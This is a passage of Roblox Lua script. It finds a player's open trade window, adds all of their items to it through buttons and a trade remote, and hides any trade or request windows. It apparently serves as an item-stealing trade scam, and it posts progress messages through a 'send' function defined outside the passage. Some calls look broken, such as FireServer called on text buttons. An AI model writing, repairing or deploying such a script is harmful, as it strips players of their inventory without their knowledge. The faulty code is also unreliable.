-- --- Strict Trade GUI Finder (Ignores Lobby/Main/HUD)
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end

    local function isValidTrade(obj)
        if not obj then return false end
        local name = obj.Name:lower()
        -- IGNORE any GUI with these names (they are NOT trade windows)
        if name:find("lobby") or name:find("main") or name:find("hud") or name:find("background") then
            return false
        end
        -- Must be Enabled/Visible
        local visible = false
        if obj:IsA("ScreenGui") then visible = obj.Enabled end
        if obj:IsA("Frame") then visible = obj.Visible end
        if not visible then return false end

        -- Must have Accept and Add buttons
        local hasAccept, hasAdd = false, false
        for _, btn in pairs(obj:GetDescendants()) do
            if btn:IsA("TextButton") then
                local bName = btn.Name:lower()
                local bText = (btn.Text or ""):lower()
                if bName:find("accept") or bText:find("accept") then hasAccept = true end
                if bName:find("add") or bText:find("add") or bName:find("select") then hasAdd = true end
            end
        end
        return hasAccept and hasAdd
    end

    -- Priority 1: Check ScreenGuis (top level)
    for _, obj in pairs(gui:GetChildren()) do
        if obj:IsA("ScreenGui") and isValidTrade(obj) then
            return obj
        end
    end

    -- Priority 2: Check large Frames (deep search)
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
            if isValidTrade(obj) then
                return obj
            end
        end
    end

    return nil
end

-- --- Add all items (GUI + remote fallback)
local function addAllItemsViaGUI(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0

    -- Try "Add All"
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            local text = (btn.Text or ""):lower()
            if name:find("add all") or text:find("add all") then
                pcall(function() btn:FireServer() end)
                send("✅ Clicked 'Add All'.")
                return 1
            end
        end
    end

    -- Click individual "Add" buttons
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            local text = (btn.Text or ""):lower()
            if name:find("add") or text:find("add") or name:find("select") then
                local parent = btn.Parent
                if parent and parent:IsA("Frame") and parent:FindFirstChild("ImageLabel") then
                    pcall(function() btn:FireServer() end)
                    count = count + 1
                end
            end
        end
    end
    return count
end

local function offerAllItemsViaRemote()
    if not OfferItem then return 0 end
    local count = 0
    local tools = {}
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    send("🔍 Found " .. #tools .. " tools for remote.")
    for _, tool in ipairs(tools) do
        local ok = pcall(function() OfferItem:FireServer(tool) end)
        if not ok then ok = pcall(function() OfferItem:FireServer(tool.Name) end) end
        if ok then count = count + 1 end
        wait(0.1)
    end
    return count
end

local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
    end
end

